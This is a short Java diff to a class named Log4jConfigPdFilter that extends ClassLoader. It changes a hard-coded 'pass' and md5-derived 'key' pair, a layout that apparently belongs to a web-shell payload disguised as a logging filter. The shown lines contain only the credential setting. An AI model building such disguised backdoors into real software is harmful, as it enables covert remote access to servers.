@@ -13,7 +13,7 @@ public class Log4jConfigPdFilter extends ClassLoader{
 
     public static String md5;
     static String pass = "pass";
-    static String key = md5("123456").substring(0, 16).toLowerCase();
+    static String key = md5("key").substring(0, 16).toLowerCase();
 
     public Log4jConfigPdFilter() {
     }
